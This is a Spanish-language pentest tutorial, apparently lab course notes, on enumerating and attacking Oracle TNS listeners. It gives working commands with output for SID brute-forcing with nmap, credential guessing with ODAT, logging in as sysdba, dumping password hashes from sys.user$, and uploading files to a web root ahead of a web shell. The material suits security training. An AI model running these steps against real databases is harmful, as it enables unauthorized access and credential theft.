
# Oracle TNS

## <mark style="color:purple;">Cómo funciona</mark>

Introducido inicialmente como parte del paquete de software [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) , TNS admite varios protocolos de red entre bases de datos Oracle y aplicaciones cliente, como `IPX/SPX`pilas `TCP/IP`de protocolos. Como resultado, se ha convertido en la solución preferida para gestionar bases de datos grandes y complejas en los sectores sanitario, financiero y minorista. Además, su mecanismo de cifrado incorporado garantiza la seguridad de los datos transmitidos, lo que la convierte en una solución ideal para entornos empresariales donde la seguridad de los datos es primordial.

Con el tiempo, TNS se ha actualizado para admitir tecnologías más nuevas, incluido `IPv6` y el cifrado `SSL/TLS`, lo que lo hace más adecuado para los siguientes propósitos:

|                       |                     |                   |           |
| --------------------- | ------------------- | ----------------- | --------- |
| Resolución de nombres | Gestión de conexión | Balanceo de carga | Seguridad |

Además, permite el cifrado entre la comunicación del cliente y el servidor a través de una capa adicional de seguridad sobre la capa del protocolo TCP/IP. Esta característica ayuda a proteger la arquitectura de la base de datos contra accesos no autorizados o ataques que intentan comprometer los datos en el tráfico de la red. Además, proporciona herramientas y capacidades avanzadas para administradores y desarrolladores de bases de datos, ya que ofrece herramientas integrales de análisis y monitoreo del rendimiento, capacidades de registro e informes de errores, administración de cargas de trabajo y tolerancia a fallas a través de servicios de bases de datos.

***

## <mark style="color:purple;">Configuración predeterminada</mark>

La configuración predeterminada del servidor Oracle TNS varía según la versión y edición del software Oracle instalado. Sin embargo, algunas configuraciones comunes generalmente se configuran de forma predeterminada en Oracle TNS. De forma predeterminada, el listener escucha las conexiones entrantes en el puerto `TCP/1521`. Sin embargo, este puerto predeterminado se puede cambiar durante la instalación o más adelante en el archivo de configuración. El listener TNS está configurado para admitir varios protocolos de red, incluidos `TCP/IP`, `UDP`, `IPX/SPX`y `AppleTalk`. El listener también puede admitir múltiples interfaces de red y escuchar en direcciones IP específicas o en todas las interfaces de red disponibles. De forma predeterminada, Oracle TNS se puede administrar de forma remota en `Oracle 8i`/ `9i` pero no en Oracle 10g/11g.

La configuración predeterminada del listener TNS también incluye algunas características de seguridad básicas. Por ejemplo, el listener solo aceptará conexiones de hosts autorizados y realizará una autenticación básica utilizando una combinación de nombres de host, direcciones IP, nombres de usuario y contraseñas. Además, el listener utilizará Oracle Net Services para cifrar la comunicación entre el cliente y el servidor. Los archivos de configuración para Oracle TNS se llaman `tnsnames.ora` y `listener.ora` y normalmente se encuentran en el directorio `$ORACLE_HOME/network/admin`. El archivo de texto sin formato contiene información de configuración para instancias de bases de datos Oracle y otros servicios de red que utilizan el protocolo TNS.

Oracle TNS se utiliza a menudo con otros servicios de Oracle como Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, servidores web y muchos más. Se han realizado muchos cambios para la instalación predeterminada de los servicios de Oracle. Por ejemplo, Oracle 9 tiene una contraseña predeterminada, `CHANGE_ON_INSTALL` mientras que Oracle 10 no tiene ninguna contraseña predeterminada establecida. El servicio DBSNMP de Oracle también utiliza una contraseña predeterminada, `dbsnmp` que debemos recordar cuando nos encontremos con ésta. Otro ejemplo sería que muchas organizaciones todavía utilizan el servicio `finger` junto con Oracle, lo que puede poner en riesgo el servicio de Oracle y hacerlo vulnerable cuando tenemos el conocimiento necesario de un directorio de inicio.

Cada base de datos o servicio tiene una entrada única en el archivo [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) , que contiene la información necesaria para que los clientes se conecten al servicio. La entrada consta de un nombre para el servicio, la ubicación de red del servicio y la base de datos o el nombre del servicio que los clientes deben usar al conectarse al servicio. Por ejemplo, un archivo `tnsnames.ora` simple podría verse así:

### **tnsnames.ora**

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Aquí podemos ver un servicio llamado `ORCL`, que está escuchando en el puerto `TCP/1521` de la dirección IP `10.129.11.102`. Los clientes deben utilizar el nombre del servicio `orcl` al conectarse al servicio. Sin embargo, el archivo `tnsnames.ora` puede contener muchas entradas de este tipo para diferentes bases de datos y servicios. Las entradas también pueden incluir información adicional, como detalles de autenticación, configuraciones de agrupación de conexiones y configuraciones de equilibrio de carga.

Por otro lado, el archivo `listener.ora` es un archivo de configuración del lado del servidor que define las propiedades y parámetros del proceso de escucha, que es responsable de recibir las solicitudes entrantes del cliente y reenviarlas a la instancia de base de datos Oracle adecuada.

### **listener.ora**

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

En resumen, el software Oracle Net Services del lado del cliente utiliza el archivo `tnsnames.ora` para resolver nombres de servicios en direcciones de red, mientras que el proceso de escucha utiliza el archivo `listener.ora` para determinar los servicios que debe escuchar y el comportamiento del escucha.

Las bases de datos de Oracle se pueden proteger utilizando la llamada Lista de exclusión de PL/SQL ( `PlsqlExclusionList`). Es un archivo de texto creado por el usuario que debe colocarse en el directorio`$ORACLE_HOME/sqldeveloper` y contiene los nombres de los paquetes o tipos PL/SQL que deben excluirse de la ejecución. Una vez creado el archivo de lista de exclusión de PL/SQL, se puede cargar en la instancia de la base de datos. Sirve como una lista negra a la que no se puede acceder a través de Oracle Application Server.

<table data-header-hidden><thead><tr><th width="202"></th><th></th></tr></thead><tbody><tr><td><strong>Configuración</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>DESCRIPTION</code></td><td>Un descriptor que proporciona un nombre para la base de datos y su tipo de conexión.</td></tr><tr><td><code>ADDRESS</code></td><td>La dirección de red de la base de datos, que incluye el nombre de host y el número de puerto.</td></tr><tr><td><code>PROTOCOL</code></td><td>El protocolo de red utilizado para la comunicación con el servidor.</td></tr><tr><td><code>PORT</code></td><td>El número de puerto utilizado para la comunicación con el servidor.</td></tr><tr><td><code>CONNECT_DATA</code></td><td>Especifica los atributos de la conexión, como el nombre del servicio o SID, el protocolo y el identificador de instancia de la base de datos.</td></tr><tr><td><code>INSTANCE_NAME</code></td><td>El nombre de la instancia de la base de datos a la que el cliente desea conectarse.</td></tr><tr><td><code>SERVICE_NAME</code></td><td>El nombre del servicio al que el cliente desea conectarse.</td></tr><tr><td><code>SERVER</code></td><td>El tipo de servidor utilizado para la conexión de la base de datos, como dedicado o compartido.</td></tr><tr><td><code>USER</code></td><td>El nombre de usuario utilizado para autenticarse con el servidor de base de datos.</td></tr><tr><td><code>PASSWORD</code></td><td>La contraseña utilizada para autenticarse con el servidor de base de datos.</td></tr><tr><td><code>SECURITY</code></td><td>El tipo de seguridad para la conexión.</td></tr><tr><td><code>VALIDATE_CERT</code></td><td>Si se valida el certificado mediante SSL/TLS.</td></tr><tr><td><code>SSL_VERSION</code></td><td>La versión de SSL/TLS que se utilizará para la conexión.</td></tr><tr><td><code>CONNECT_TIMEOUT</code></td><td>El límite de tiempo en segundos para que el cliente establezca una conexión a la base de datos.</td></tr><tr><td><code>RECEIVE_TIMEOUT</code></td><td>El límite de tiempo en segundos para que el cliente reciba una respuesta de la base de datos.</td></tr><tr><td><code>SEND_TIMEOUT</code></td><td>El límite de tiempo en segundos para que el cliente envíe una solicitud a la base de datos.</td></tr><tr><td><code>SQLNET.EXPIRE_TIME</code></td><td>El límite de tiempo en segundos para que el cliente detecte una conexión ha fallado.</td></tr><tr><td><code>TRACE_LEVEL</code></td><td>El nivel de seguimiento de la conexión de la base de datos.</td></tr><tr><td><code>TRACE_DIRECTORY</code></td><td>El directorio donde se almacenan los archivos de seguimiento.</td></tr><tr><td><code>TRACE_FILE_NAME</code></td><td>El nombre del archivo de seguimiento.</td></tr><tr><td><code>LOG_FILE</code></td><td>El archivo donde se almacena la información del registro.</td></tr></tbody></table>

Antes de que podamos enumerar el listener TNS e interactuar con él, debemos descargar algunos paquetes y herramientas para nuestro entorno de atacante en caso de que no los tengas. Aquí hay un script Bash que hace todo eso:

### **Oracle-Tools-setup.sh**

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

Después de eso, podemos intentar determinar si la instalación fue exitosa ejecutando el siguiente comando:

**Prueba de ODAT**

```shell-session
afsh4ck$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Oracle Database Attacking Tool ( `ODAT`) es una herramienta de pruebas de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en las bases de datos de Oracle. Se puede utilizar para identificar y explotar diversas fallas de seguridad en las bases de datos de Oracle, incluida la inyección SQL, la ejecución remota de código y la escalada de privilegios.

***

## <mark style="color:purple;">Enumeración del servicio</mark>

Ahora usemos `nmap` para escanear el puerto de escucha predeterminado de Oracle TNS `1521`.

### **Nmap**

```bash
afsh4ck$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que el puerto está abierto y el servicio se está ejecutando. En Oracle RDBMS, un Identificador del sistema ( `SID`) es un nombre único que identifica una instancia de base de datos particular. Puede tener varias instancias, cada una con su propio ID del sistema. Una instancia es un conjunto de procesos y estructuras de memoria que interactúan para administrar los datos de la base de datos. Cuando un cliente se conecta a una base de datos Oracle, especifica la base de datos `SID`junto con su cadena de conexión. El cliente utiliza este SID para identificar a qué instancia de base de datos desea conectarse. Supongamos que el cliente no especifica un SID. Luego, `tnsnames.ora` utiliza el valor predeterminado definido en el archivo.

Los SID son una parte esencial del proceso de conexión, ya que identifican la instancia específica de la base de datos a la que el cliente desea conectarse. Si el cliente especifica un SID incorrecto, el intento de conexión fallará. Los administradores de bases de datos pueden utilizar el SID para monitorear y administrar las instancias individuales de una base de datos. Por ejemplo, pueden iniciar, detener o reiniciar una instancia, ajustar su asignación de memoria u otros parámetros de configuración y monitorear su rendimiento utilizando herramientas como Oracle Enterprise Manager.

Hay varias formas de enumerar, o mejor dicho, adivinar los SID. Por lo tanto podemos utilizar herramientas como `nmap`, `hydra`, `odat`y otras. Usemos `nmap` primero.

### **Nmap - Fuerza bruta SID**

```shell-session
afsh4ck@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

Podemos utilizar la herramienta `odat.py` para realizar una variedad de escaneos para enumerar y recopilar información sobre los servicios de la base de datos Oracle y sus componentes. Esos escaneos pueden recuperar nombres de bases de datos, versiones, procesos en ejecución, cuentas de usuario, vulnerabilidades, configuraciones incorrectas, etc. Usemos la opción `all` y probemos todos los módulos de `odat.py`.

### **ODAT**

```bash
afsh4ck$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

En este ejemplo, encontramos credenciales válidas para el usuario `scott` y su contraseña `tiger`. Después de eso, podemos usar la herramienta `sqlplus` para conectarnos a la base de datos Oracle e interactuar con ella.

## Instalación de SQLplus

Ejecutar los siguientes comandos en orden para instalar SQLplus en Kali Linux:

```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip 
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
cd /opt/oracle/instantclient_21_4 && find . -type f | sort
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
sqlplus -V
```

### **SQLplus - Iniciar sesión**

```bash
afsh4ck$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Si encuentra el siguiente error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, ejecute lo siguiente, tomado de [aquí](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared) .

```bash
afsh4ck$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Hay muchos [comandos de SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar la base de datos manualmente. Por ejemplo, podemos enumerar todas las tablas disponibles en la base de datos actual o mostrarnos los privilegios del usuario actual de la siguiente manera:

### **Oracle RDBMS: interacción**

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aquí, el usuario `scott` no tiene privilegios administrativos. Sin embargo, podemos intentar usar esta cuenta para iniciar sesión como administrador de la base de datos del sistema ( `sysdba`), lo que nos otorga mayores privilegios. Esto es posible cuando el usuario `scott`tiene los privilegios adecuados que normalmente otorga el administrador de la base de datos o que utiliza el propio administrador.

### **Oracle RDBMS: enumeración de bases de datos**

```bash
afsh4ck$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Podemos seguir muchos enfoques una vez que tengamos acceso a una base de datos Oracle. Depende en gran medida de la información que tengamos y de toda la configuración. Sin embargo, no podemos agregar nuevos usuarios ni realizar modificaciones. A partir de este punto, podríamos recuperar los hash de las contraseñas `sys.user$`e intentar descifrarlos sin conexión. La consulta para esto sería similar a la siguiente:

### **Oracle RDBMS: extraer hashes de contraseñas**

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Otra opción es cargar un shell web en el destino. Sin embargo, esto requiere que el servidor ejecute un servidor web y necesitamos saber la ubicación exacta del directorio raíz del servidor web. No obstante, si sabemos qué tipo de sistema estamos tratando, podemos probar las rutas por defecto, que son:

| **SO**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

En primer lugar, siempre es importante probar nuestro enfoque de explotación con archivos que no parezcan peligrosos para los sistemas antivirus o de detección/prevención de intrusiones. Por lo tanto, creamos un archivo de texto con una cadena y lo usamos para cargarlo en el sistema de destino.

### **Oracle RDBMS: carga de archivos**

```bash
afsh4ck$ echo "Oracle File Upload Test" > testing.txt
afsh4ck$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos probar si el método de carga de archivos funcionó con `curl`. Por lo tanto, utilizaremos una solicitud `GET http://<IP>` o podemos visitarla a través del navegador.

```bash
afsh4ck$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
